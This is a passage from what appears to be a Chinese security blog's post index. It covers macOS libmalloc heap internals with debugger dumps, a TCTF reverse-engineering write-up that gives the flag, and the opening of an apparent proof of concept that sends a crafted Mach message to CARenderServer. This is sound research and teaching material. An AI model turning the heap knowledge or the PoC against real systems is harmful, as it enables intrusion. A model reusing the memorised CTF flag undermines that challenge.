return; } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d if (DEPOT_MAGAZINE_INDEX != mag_index) { if (msize &lt; TINY_QUANTUM) { // to see if the bits fit in the last 4 bits void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize; region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn; /* check that we don&#39;t already have this pointer in the cache */ if (ptr == ptr2) { free_tiny_botch(rack, ptr); return; } if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) { memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize)); } tiny_mag_ptr-&gt;mag_last_free = ptr; tiny_mag_ptr-&gt;mag_last_free_msize = msize; tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region; if (!ptr2) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return; } msize = msize2; ptr = ptr2; tiny_region = rgn2; } } #endif /* CONFIG_TINY_CACHE */ // Now in the time it took to acquire the lock, the region may have migrated // from one magazine to another. I.e. trailer-&gt;mag_index is volatile. // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock) // is stale. If so, keep on tryin&#39; ... region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region); mag_index_t refreshed_index; while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); mag_index = refreshed_index; tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); } CHECK(szone, __PRETTY_FUNCTION__); } free的时候先将该内存缓存到mag_last_free，若之前mag_last_free为NULL，那么该内存暂时不会被free，仅仅是缓存到mag_last_free。反之，则会将mag_last_free之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点 最近free的内存会被缓存，不会立即合并 在被free的块metadata是被保护的 前后指针按16字节大小对齐 指针前4位为checksum 关于free块checksum计算如下： static MALLOC_INLINE uintptr_t free_list_checksum_ptr(rack_t *rack, void *ptr) { uintptr_t p = (uintptr_t)ptr; return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction } 指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。 实验代码如下 #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { void *p1,*p2,*p3,*p4; p1 = malloc(24); p2 = malloc(24); p3 = malloc(24); p4 = malloc(24); memset(p1,0xaa,24); memset(p2,0xbb,24); memset(p3,0xcc,24); free(p1); free(p3); free(p2); free(p4); } free(p1)，直接将p1缓存，所以内存值不变 (lldb) x/24gx p1 0x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa 0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节 (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1 (lldb) x/24gx p1 0x1002001f0: 0x3000000010020023 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x200000001002001f 0x100200240: 0xcccccccccccc0002 0x0002000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x5000000010020048 0x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x1000000010020108 0x100200240: 0xcccccccccccc0002 0x0006000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。 libmalloc中一些结构体szone_s // magazine_zone.htypedef struct szone_s { // vm_allocate()&#39;d, so page-aligned to begin with. malloc_zone_t basic_zone; // first page will be given read-only protection uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)]; unsigned long cpu_id_key; // unused // remainder of structure is R/W (contains no function pointers) unsigned debug_flags; void *log_address; /* Allocation racks per allocator type. */ struct rack_s tiny_rack; struct rack_s small_rack; /* large objects: all the rest */ _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large unsigned num_large_objects_in_use; unsigned num_large_entries; large_entry_t *large_entries; // hashed by location; null entries don&#39;t count size_t num_bytes_in_large_objects; #if CONFIG_LARGE_CACHE int large_entry_cache_oldest; int large_entry_cache_newest; large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free boolean_t large_legacy_reset_mprotect; size_t large_entry_cache_reserve_bytes; size_t large_entry_cache_reserve_limit; size_t large_entry_cache_bytes; // total size of death row, bytes #endif /* flag and limits pertaining to altered malloc behavior for systems with * large amounts of physical memory */ unsigned is_largemem; unsigned large_threshold; unsigned vm_copy_threshold; /* security cookie */ uintptr_t cookie; /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */ struct szone_s *helper_zone; boolean_t flotsam_enabled; } szone_t; malloc_zone_t // malloc.htypedef struct _malloc_zone_t { /* Only zone implementors should depend on the layout of this structure; Regular callers should use the access functions below */ void *reserved1; /* RESERVED FOR CFAllocator DO NOT USE */ void *reserved2; /* RESERVED FOR CFAllocator DO NOT USE */ size_t (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */ void *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size); void *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */ void *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */ void (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr); void *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size); void (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g const char *zone_name; /* Optional batch callbacks; these may be NULL */ unsigned (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */ void (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */ struct malloc_introspection_t * MALLOC_INTROSPECT_TBL_PTR(introspect); unsigned version; /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */ void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size); /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/ void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size); /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */ size_t (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal); /* * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10. * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has * not yet been allocated. False negatives are not allowed. */ boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr); } malloc_zone_t; rack_t // magazine_rack.htypedef struct rack_s { /* Regions for tiny objects */ _malloc_lock_s region_lock MALLOC_CACHE_ALIGN; rack_type_t type; size_t num_regions; size_t num_regions_dealloc; region_hash_generation_t *region_generation; region_hash_generation_t rg[2]; region_t initial_regions[INITIAL_NUM_REGIONS]; int num_magazines; unsigned num_magazines_mask; int num_magazines_mask_shift; uint32_t debug_flags; // array of per-processor magazines magazine_t *magazines; uintptr_t cookie; uintptr_t last_madvise; } rack_t; magazine_t // magazine_zone.htypedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with. // Take magazine_lock first, Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN; // Protection for the crtical section that does allocate_pages outside the magazine_lock volatile boolean_t alloc_underway; // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size. void *mag_last_free; msize_t mag_last_free_msize; // msize for mag_last_free #if MALLOC_TARGET_64BIT uint32_t _pad; #endif region_t mag_last_free_rgn; // holds the region for mag_last_free free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS]; uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS]; // the first and last free region in the last block are treated as big blocks in use that are not accounted for size_t mag_bytes_free_at_end; size_t mag_bytes_free_at_start; region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0 // bean counting ... size_t mag_num_bytes_in_objects; size_t num_bytes_in_magazine; unsigned mag_num_objects; // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria. // Doubly linked list for efficient extraction. unsigned recirculation_entries; region_trailer_t *firstNode; region_trailer_t *lastNode; #if MALLOC_TARGET_64BIT uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS - (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2]; #else uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS - MAGAZINE_FREELIST_BITMAP_WORDS]; #endif } magazine_t; tiny_region_t //magazine_zone.h/* * Layout of a tiny region */ typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t)) typedef struct tiny_header_inuse_pair { uint32_t header; uint32_t inuse; } tiny_header_inuse_pair_t; typedef struct region_trailer { struct region_trailer *prev; struct region_trailer *next; boolean_t recirc_suitable; volatile int pinned_to_depot; unsigned bytes_used; mag_index_t mag_index; } region_trailer_t; #define NUM_TINY_BLOCKS 64520 typedef struct tiny_region { tiny_block_t blocks[NUM_TINY_BLOCKS]; region_trailer_t trailer; // The interleaved bit arrays comprising the header and inuse bitfields. // The unused bits of each component in the last pair will be initialized to sentinel values. tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS]; uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE]; } * tiny_region_t; 参考 http://phrack.org/issues/63/5.html https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html &lt;&lt;the Mac Hacker’s Handbook&gt;&gt; 第8章Exploiting Heap Overflows https://opensource.apple.com/source/libmalloc/ 源代码 http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf","tags":[{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"}]},{"title":"TCTF-Elements","date":"2019-03-27T07:13:30.000Z","path":"2019/03/27/TCTF-Elements/TCTF-Elements/","text":"TCTF-Elements 这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。 Elements下面是main函数伪代码 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char v3; // bl const __int32_t **v4; // rax char *v5; // rcx size_t v6; // rcx signed __int64 result; // rax char *v8; // r12 signed __int64 v9; // r14 char v10; // bl signed __int64 v11; // rax const unsigned __int16 *v12; // rcx signed __int64 v13; // rdx __int64 v14; // rsi unsigned __int16 v15; // bx signed __int64 v16; // rsi __m128i v17; // xmm0 char *v18; // rax double v19; // xmm2_8 double v20; // xmm0_8 double v21; // xmm2_8 double v22; // xmm3_8 double v23; // [rsp+20h] [rbp-148h] double v24; // [rsp+28h] [rbp-140h] double v25; // [rsp+30h] [rbp-138h] char s[8]; // [rsp+40h] [rbp-128h] char v27; // [rsp+6Bh] [rbp-FDh] fgets(s, 256, stdin); v3 = s[0]; if ( s[0] ) { v4 = __ctype_tolower_loc(); v5 = &amp;s[1]; do { *(v5 - 1) = (*v4)[v3]; v3 = *v5++; } while ( v3 ); } v6 = strlen(s); result = 0LL; if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 ) { v27 = 0; v8 = strtok(&amp;s[5], &quot;-&quot;); v9 = 0LL; if ( v8 ) { while ( strlen(v8) == 12 ) { v10 = *v8; v11 = 0LL; if ( *v8 ) { v12 = *__ctype_b_loc(); v13 = 1LL; v11 = 0LL; do { v14 = v10; v15 = v12[v10]; if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 ) { v16 = v14 - 87; } else { if ( !(v15 &amp; 0x800) ) goto LABEL_31; v16 = v14 - 48; } v11 = v16 | 16 * v11; if ( v13 &gt; 11 ) break; v10 = v8[v13++]; } while ( v10 ); } if ( !v9 &amp;&amp; v11 != 62791383142154LL ) break; v17 = (__m128i)_mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0), (__m128d)xmmword_400BE0); *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64; v18 = strtok(0LL, &quot;-&quot;); v8 = v18; if ( v9 &gt; 2 || !v18 ) { if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } return 0LL; } } } LABEL_31: result = 0xFFFFFFFFLL; } return result; } 这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。 分析可得到需要输入以下格式flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx} 这里通过-分割成三个部分，其中第一部分是已知的391bc2164f0a，后面就是程序验证逻辑 if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } 当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式 $c&gt;b,b&gt;a,a+b&gt;c$ $p=\\frac{\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$ $q=\\frac{abc}{(\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$ $-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $ 但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3 from z3 import * x = Real(&#39;x&#39;) y = Real(&#39;y&#39;) z = Real(&#39;z&#39;) m = Real(&#39;m&#39;) n = Real(&#39;n&#39;) p = Real(&#39;p&#39;) q = Real(&#39;q&#39;) solver = Solver() m = x*x+y*y-z*z n = (4.0*x*x*y*y-m*m)**0.5*0.25 p = 2*n/(x+y+z) + (-1.940035480806554296875E13) q = x*y*z/(4.0*n) + (-4.777053952827391e13) solver.add(z &gt; y) solver.add(y &gt; x) solver.add(x + y &gt; z) solver.add(p &gt; -100,p&lt;100) solver.add(q &gt; -100,q&lt;100) solver.add(x == 6.2791383142154e13) if solver.check() == sat: print(solver.model()) else: print(&#39;unsolve&#39;) 结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因 下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式 $$Rr=\\frac{abc}{2(a+b+c)}$$ $$tan\\frac{C}{2} = \\frac{2r}{a+b-c} = \\frac{sinC}{1+cosC}$$ 这里$sinC,cosC,R,r,c$都是已知的 所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$ 得到对应的浮点数表示4064e4798769,56e0de138176 movq xmm0, rax punpckldq xmm0, xmmword ptr cs:qword_400BD0 subpd xmm0, cs:xmmword_400BE0 pshufd xmm1, xmm0, 4Eh addpd xmm1, xmm0 movlpd [rsp+r14*8+168h+var_148], xmm1 在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊 qword_400BD0=0x4530000043300000 xmmword_400BE0=0x45300000000000004330000000000000 punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分 然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。 所以其实这里的变换等于没有变换。 所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176 最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176} 补充：浮点数表示、运算、指令浮点数有单精度和双精度之分，float占4个字节，double占8个字节 在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^sM2^E$ e等于向左或向右移动到1为止的个数 比如：12.25 对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$ 下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位） 符号位0，指数3，尾数10001(第一位默认为1不需要表示) 由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数 其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示10000000+11-1=10000010 最后12.15单精度浮点数表示为：0 10000010 10001000000000000000000 十六进制：0x41440000 内存中小端表示：00 00 44 41 Float/Double 符号位 指数 尾数 示例 16进制 Float 1位 8位 23位 0 10000010 10001000000000000000000 41440000 Double 1位 11位 52位 0 10000000010 1000100000000000000000000000 000000000000000000000000 4028800000000000 特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。 在线转换http://www.binaryconvert.com/ 浮点数在进行加减运算的时候需要先对阶然后尾数部分运算 浮点数指令查询https://asm.inightmare.org/opcodelst/index.php 这里解释下pshufd xmm1, xmm0, 4Eh指令 pshufd可以按照指定的方式重新排列数据 这里4E二进制01 00 11 10 寄存器 值 xmm0 42cc8d80 00000000 41e842c9 e1400000 4E 01 00 11 10 xmm1 41e842c9 e1400000 42cc8d80 00000000","tags":[{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"},{"name":"tctf","slug":"tctf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"}]},{"title":"idapython learning note","date":"2019-03-07T11:42:24.000Z","path":"2019/03/07/idapython-learning-note/idapython-learning-note/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[]},{"title":"1amb4ck","date":"2019-03-05T15:26:30.000Z","path":"2019/03/05/1amb4ck/1amb4ck/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"XNU系统调用深度解析","date":"2019-01-30T05:53:00.000Z","path":"2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/","text":"XNU系统调用深度解析 从一个函数分析到系统调用的内核实现 由一段POC而起#include &lt;stdio.h&gt; #include &lt;mach/i386/kern_return.h&gt; #include &lt;mach/mach_traps.h&gt; #include &lt;servers/bootstrap.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/stat.h&gt; #include &lt;time.h&gt; #include &lt;dlfcn.h&gt; #include &lt;unistd.h&gt; typedef struct quartz_register_client_s quartz_register_client_t; struct quartz_register_client_s { mach_msg_header_t header; uint32_t body; mach_msg_port_descriptor_t ports[4]; char padding[12]; }; typedef struct quartzcore_mach_msg quartzcore_mach_msg_t; struct quartzcore_mach_msg{ mach_msg_header_t header; char msg_body[712]; }; uint64_t get_filesize(const char *fn){ struct stat st; stat(fn, &amp;st); uint64_t fsize = st.st_size; return fsize; }; int main(int argc, const char * argv[]) { mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL; task_get_bootstrap_port(mach_task_self(), &amp;bs_port); const char *render_service_name = &quot;com.apple.CARenderServer&quot;; kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;); kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p); if (kr != KERN_SUCCESS) { return -1; } printf(&quot;[*] Get service of %s successully!\\n&quot;, render_service_name); quartz_register_client_t msg_register; memset(&amp;msg_register, 0, sizeof(msg_register)); msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX; msg_register.header.msgh_remote_port = p; msg_register.header.msgh_local_port = mig_get_reply_port(); msg_register.header.msgh_id = 40202; // _XRegisterClient msg_register.body = 4; msg_register.ports[0].name = mach_task_self(); msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[1].name = mach_task_self(); msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[2].name = mach_task_self(); msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[3].name = mach_task_self(); msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR; kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG, sizeof(quartz_register_client_t), 